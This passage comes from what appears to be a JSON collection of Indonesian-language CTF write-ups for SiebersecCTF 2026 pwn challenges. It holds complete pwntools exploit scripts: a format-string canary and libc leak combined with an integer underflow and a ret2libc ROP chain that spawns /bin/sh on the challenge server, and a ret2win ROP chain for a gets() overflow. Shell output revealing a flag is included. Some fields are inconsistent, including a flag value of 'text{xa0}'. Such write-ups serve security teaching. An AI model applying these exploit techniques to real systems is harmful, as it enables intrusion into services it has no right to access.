x86_64 dimulai dari indeks stack ke-6 ditambah 1, maka posisi Canary berada tepat pada indeks format string %27$p.\n\nPosisi Return Address utama (alamat Libc penunjuk fungsi __libc_start_call_main+120) berada tepat pada indeks format string %29$p.\n\nJarak konstan (offset) dari alamat leak indeks 29 ke Libc Base pada biner libc.so.6 (GLIBC 2.39) yang diberikan adalah tepat 0x2a578.\n\nLangkah 2: Penanganan Badchar (\\x0a)\n\nFungsi fgets memiliki sifat dasar akan berhenti membaca input jika mendeteksi byte Newline (\\x0a). Karena ASLR mengacak memori pada setiap eksekusi, ada kemungkinan alamat Canary atau fungsi Libc (seperti system atau /bin/sh) mengandung byte 0x0a secara acak.\n\nUntuk mengatasinya, skrip eksploitasi dikonfigurasi melakukan penyaringan (looping connection) secara otomatis sampai mendapatkan alokasi alamat memori yang bersih dari badchar \\x0a.\n\nLangkah 3: ROP Chain & Penyelarasan Stack (MOVAPS Fix)\n\nKita menyusun rantai instruksi Return-Oriented Programming (ROP) berbasis teknik Ret2Libc:\n\nIsi buffer s dengan padding sampah sebanyak 88 byte ($0\\text{x60} - 0\\text{x8} = 0\\text{x58} = 88$).\n\nMasukkan nilai Canary remote yang berhasil dibocorkan agar program tidak mendeteksi manipulasi stack (__stack_chk_fail).\n\nMasukkan dummy data 8 byte untuk menimpa posisi Saved RBP.\n\nMasukkan gadget ret ekstra. Langkah ini wajib dilakukan untuk meluruskan Stack Alignment kelipatan 16-byte sebelum memicu instruksi movaps di dalam fungsi system pada sistem operasi modern (Ubuntu/Debian).\n\nMasukkan gadget pop rdi; ret untuk menyuplai argumen pertama ke fungsi system.\n\nMasukkan alamat string \"/bin/sh\" yang berada di dalam Libc.\n\nMasukkan alamat fungsi system dari Libc untuk mengeksekusi shell.\n\n4. Kode Eksploitasi Akhir (Python Script)\n\nBerikut adalah kode eksploitasi final menggunakan pustaka pwntools:\n\nfrom pwn import *\nimport time\n\nelf = ELF('./chal')\nlibc = ELF('./libc.so.6')\ncontext.binary = elf\n\noffset_libc = 0x2a578  # Offset presisi GLIBC 2.39 indeks 29\n\nwhile True:\n    try:\n        # Menghubungkan ke server tantangan remote\n        p = remote('chal.sieberr.live', 21003)\n        \n        # 1. Bocorkan Canary & Alamat Libc Remote\n        p.sendlineafter(b\"What is your name?\", b\"%27$p %29$p\")\n        p.recvuntil(b\"Welcome, \")\n        leak_data = p.recvline().strip().split()\n        \n        canary = int(leak_data[0], 16)\n        leak_libc = int(leak_data[1], 16)\n        libc.address = leak_libc - offset_libc\n        \n        # 2. Ambil Gadget ROP dari Libc terhitung\n        rop = ROP(libc)\n        pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]\n        ret = rop.find_gadget(['ret'])[0]\n        bin_sh = next(libc.search(b\"/bin/sh\\x00\"))\n        system_addr = libc.symbols['system']\n        \n        # Saringan Badchar \\x0a (Memastikan payload tidak terpotong prematur oleh fgets)\n        check_bytes = p64(canary) + p64(ret) + p64(pop_rdi) + p64(bin_sh) + p64(system_addr)\n        if b'\\x0a' in check_bytes:\n            p.close()\n            continue\n            \n        log.success(f\"Libc Base Remote Sukses: {hex(libc.address)}\")\n        log.success(f\"Canary Remote Sukses: {hex(canary)}\")\n        \n        # 3. Strukturisasi Payload ROP (Padding Buffer: 88 byte)\n        payload = b\"A\" * 88\n        payload += p64(canary)\n        payload += b\"B\" * 8          # Saved RBP\n        payload += p64(ret)          # Penyelaras Stack 16-byte (MOVAPS Fix)\n        payload += p64(pop_rdi)       # Konfigurasi parameter fungsi\n        payload += p64(bin_sh)        # RDI = Alamat \"/bin/sh\"\n        payload += p64(system_addr)  # Panggil system()\n        \n        # 4. Kirim serangan pemicu Integer Underflow\n        p.sendlineafter(b\"How much space do you want?\", b\"-1\")\n        p.sendline(payload)          \n        \n        # Berikan jeda transmisi soket agar proses perpindahan ke /bin/sh stabil\n        time.sleep(0.5)\n        p.clean(timeout=0.5)\n        \n        log.info(\"Membuka interaksi Shell...\")\n        p.interactive()\n        break\n        \n    except Exception:\n        try: p.close()\n        except: pass\n\n\nHasil Eksekusi Sukses:\n\n[+] Libc Base Remote Sukses: 0x7020bfd00000\n[+] Canary Remote Sukses: 0x7bd421e892945400\n[*] Membuka interaksi Shell... Ketik 'cat flag.txt'\n[*] Switching to interactive mode\n$ cat flag.txt\nsctf{C4tS_L0ve_pl4y1Ng_1n_tHe_suN}\n\n\n5. Kesimpulan\n\nTantangan CanaryIsland mengajarkan pentingnya melakukan sanitasi tipe data (menghindari konversi implisit signed/unsigned yang berbahaya pada fungsi alokasi ukuran seperti fgets / read) dan menghindari penggunaan printf secara langsung tanpa format specifier yang aman.",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "from pwn import *\r\nimport time\r\n\r\nelf = ELF('./chal')\r\nlibc = ELF('./libc.so.6')\r\ncontext.binary = elf\r\n\r\noffset_libc = 0x2a578  # Offset presisi GLIBC 2.39 indeks 29\r\n\r\nwhile True:\r\n    try:\r\n        p = remote('chal.sieberr.live', 21003)\r\n        \r\n        # 1. Leak Canary & Libc Remote\r\n        p.sendlineafter(b\"What is your name?\", b\"%27$p %29$p\")\r\n        p.recvuntil(b\"Welcome, \")\r\n        leak_data = p.recvline().strip().split()\r\n        \r\n        canary = int(leak_data[0], 16)\r\n        leak_libc = int(leak_data[1], 16)\r\n        libc.address = leak_libc - offset_libc\r\n        \r\n        # 2. Ambil Gadget ROP\r\n        rop = ROP(libc)\r\n        pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]\r\n        ret = rop.find_gadget(['ret'])[0]\r\n        bin_sh = next(libc.search(b\"/bin/sh\\x00\"))\r\n        system_addr = libc.symbols['system']\r\n        \r\n        # Saringan Badchar \\x0a (Newline pembunuh fgets)\r\n        check_bytes = p64(canary) + p64(ret) + p64(pop_rdi) + p64(bin_sh) + p64(system_addr)\r\n        if b'\\x0a' in check_bytes:\r\n            p.close()\r\n            continue\r\n            \r\n        log.success(f\"Libc Base Remote Sukses: {hex(libc.address)}\")\r\n        log.success(f\"Canary Remote Sukses: {hex(canary)}\")\r\n        \r\n        # 3. Susun Payload Utama (Padding: 88 byte)\r\n        payload = b\"A\" * 88\r\n        payload += p64(canary)\r\n        payload += b\"B\" * 8          # Saved RBP\r\n        payload += p64(ret)          # Stack Alignment (MOVAPS Fix)\r\n        payload += p64(pop_rdi)\r\n        payload += p64(bin_sh)\r\n        payload += p64(system_addr)\r\n        \r\n        # 4. Kirim Serangan secara hati-hati\r\n        p.sendlineafter(b\"How much space do you want?\", b\"-1\")\r\n        \r\n        # Kirim payload dan berikan jeda micro-second agar server memproses stack frame\r\n        p.sendline(payload)\r\n        time.sleep(0.5)\r\n        \r\n        # Bersihkan sisa output buffer sebelum masuk mode interaktif\r\n        p.clean(timeout=0.5)\r\n        \r\n        log.info(\"Membuka interaksi Shell... Ketik 'cat flag.txt'\")\r\n        p.interactive()\r\n        break\r\n        \r\n    except Exception:\r\n        try: p.close()\r\n        except: pass"
      }
    ],
    "terminalOutputs": [],
    "flag": "text{xa0}",
    "lessonsLearned": ""
  },
  {
    "id": "siebersecctf-pwn-owowhatthis-dist",
    "title": "SiebersecCTF 2026 - owo what's this? (Pwn)",
    "category": "Pwn",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-08",
    "author": "Nattt",
    "ctfName": "SiebersecCTF",
    "tags": [],
    "description": "Writeup for challenge SiebersecCTF 2026 - owo what's this? (Pwn)",
    "problemDescription": "",
    "tools": [],
    "analysis": "Program mengalami kerentanan Stack Buffer Overflow klasik pada fungsi `main` akibat penggunaan fungsi `gets(buf)`. Fungsi `gets` tidak memvalidasi panjang input yang diterima, sehingga input yang melebihi ukuran buffer akan langsung menimpa area memori di atasnya, termasuk Saved RBP dan Return Address (RIP).\n\nHasil pemeriksaan keamanan biner (`checksec`):\n- **Canary**: Disabled (Kondisi ideal untuk mengontrol RIP secara langsung).\n- **PIE**: Disabled (Alamat fungsi di memori bersifat statis/tetap pada basis `0x400000`).\n- **NX**: Enabled (Stack tidak dapat dieksekusi, sehingga harus menggunakan teknik ROP).\n\nBerdasarkan analisis kode assembly di `main`, posisi buffer berada di `rbp-0x10` (16 bytes). Jarak aman untuk menimpa Return Address adalah:\n`16 bytes (buffer) + 8 bytes (saved RBP) = 24 bytes padding.`",
    "solution": [
      {
        "title": "Exploitation Strategy",
        "content": "Tujuan eksploitasi adalah memanggil fungsi `owo_whats_thissssssssssssss` (`0x004011a3`) dengan argumen pertama (`RDI`) bernilai `67416741` (`0x404b2a5`).\n\nLangkah penyusunan ROP Chain:\n1. Isi padding sebanyak 24 byte untuk menjangkau RIP.\n2. Gunakan gadget `ret` (`0x0040119f`) untuk menyelaraskan stack pointer (Stack Alignment 16-byte) agar fungsi `printf` pada remote server tidak mengalami crash akibat instruksi `MOVAPS`.\n3. Panggil gadget `pop rdi; ret` (`0x0040119e`) yang berada di dalam fungsi `owo_whats_this`.\n4. Masukkan nilai target `67416741` ke dalam stack agar ter-pop ke register `RDI`.\n5. Arahkan eksekusi ke fungsi `owo_whats_thissssssssssssss`."
      },
      {
        "title": "Exploit Script",
        "content": "```python\nfrom pwn import *\n\np = remote('chal.sieberr.live', 21001)\n\npop_rdi_ret = 0x0040119e \nret_gadget = 0x0040119f   \ntarget_func = 0x004011a3\nargument_sus = 67416741\n\npayload = b\"A\" * 24\npayload += p64(ret_gadget)   \npayload += p64(pop_rdi_ret)\npayload += p64(argument_sus)\npayload += p64(target_func)\n\np.sendlineafter(b\">>> \", payload)\np.interactive()\n\nFlag\nsctf{b0rn_70_h1i1i_:3_f0Rc3d_t0_r3g4rD1Ng_mY_l457_3M4iL}"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "from pwn import *\r\n\r\np = remote('chal.sieberr.live', 21001)\r\n# p = process('./owo')\r\n\r\n# Alamat presisi dari hasil objdump\r\npop_rdi_ret = 0x0040119e \r\nret_gadget = 0x0040119f   # Digunakan untuk Stack Alignment 16-byte\r\ntarget_func = 0x004011a3\r\nargument_sus = 67416741\r\n\r\n# ROP Chain yang sudah diperbaiki alignment-nya\r\npayload = b\"A\" * 24\r\npayload += p64(ret_gadget)   # <--- Penyelamat dari MOVAPS crash\r\npayload += p64(pop_rdi_ret)\r\npayload += p64(argument_sus)\r\npayload += p64(target_func)\r\n\r\nlog.info(\"Mengirimkan ROP Chain dengan Stack Alignment Fix...\")\r\np.sendlineafter(b\">>> \", payload)\r\np.interactive()"
      }
    ],
    "terminalOutputs": [],
    "flag": "",
    "lessonsLearned": ""
  }
];
